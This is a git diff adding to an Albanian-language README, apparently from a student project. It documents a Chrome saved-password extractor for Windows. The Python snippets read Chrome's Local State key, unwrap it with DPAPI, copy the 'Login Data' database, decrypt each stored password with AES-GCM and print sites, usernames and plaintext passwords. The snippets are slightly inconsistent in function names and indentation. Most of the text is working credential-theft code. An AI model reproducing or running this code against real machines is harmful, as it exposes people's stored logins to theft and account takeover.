@@ -25,4 +25,90 @@ pip install pycryptodomex
 ---
 ## Implementimi
 > Hapat realizues:
-1. 
+1. Fillimisht kemi nje funksion qe merr daten dhe kohen
+2. Marrja e qelsit enkriptues te shfletuesit
+3. Dekriptimi i fjalkalimit
+4. Lidhja me databaz
+5. Selektimi i rreshtave te tabeles "login"
+6. Iterimi ne te gjith rreshtat 
+7. Printimi i te gjith rreshtave qe i merr
+8. Mbyllja e databazes
+9. Largimi i file-it te krijuar
+
+### Marrja e qelsit enkriptues
+```python
+def fetching_encryption_key():
+    # Pathi qe eshte ne kompjuterin e shfrytzuesit
+    local_computer_directory_path = os.path.join(
+        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
+        "User Data", "Local State")
+
+    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
+        local_state_data = f.read()
+        local_state_data = json.loads(local_state_data)
+
+    # Dekodimi i qelsit enkriptues duke perdorur base64
+    encryption_key = base64.b64decode(
+        local_state_data["os_crypt"]["encrypted_key"])
+
+    # Largimi i "Windows Data Protection API" ose "DPAPI"
+    encryption_key = encryption_key[5:]
+
+    # Kthen qelsin e dekriptuar
+    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
+```
+
+### Dekriptimi i fjalkalimit
+```python 
+def password_decryption(password, encryption_key):
+    try:
+        iv = password[3:15]
+        password = password[15:]
+
+        # Gjeneron shifren
+        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
+
+        # Dekripton fjalkalimin
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+
+        try:
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except:
+            return "No Passwords"
+```
+### Krijimi i nje file per ruajtjen e te dhenave
+```python
+  key = fetching_encryption_key_chrome()
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                           "Google", "Chrome", "User Data", "Default", "Login Data")
+    filename = "RandomeName.db"
+    shutil.copyfile(db_path, filename)
+```
+
+### Marrja e te dhenave nga file ku i kemi ruajtur dhe shtypja e tyre
+```python
+ for row in cursor.fetchall():
+        main_url = row[0]
+        login_page_url = row[1]
+        user_name = row[2]
+        decrypted_password = password_decryption_chrome(row[3], key)
+        date_of_creation = row[4]
+        last_usuage = row[5]
+
+        if user_name or decrypted_password:
+            print(f"Main URL: {main_url}")
+            print(f"Login URL: {login_page_url}")
+            print(f"User name: {user_name}")
+            print(f"Decrypted Password: {decrypted_password}")
+```
+
+---
+
+## Punuan
+
+- [@AdhuresaSylejmani](https://github.com/AdhuresaSylejmani)
+- [@AdnitKamberi](https://github.com/adnit)
+- [@ArbenDedaj](https://github.com/ArbDe)
+
+
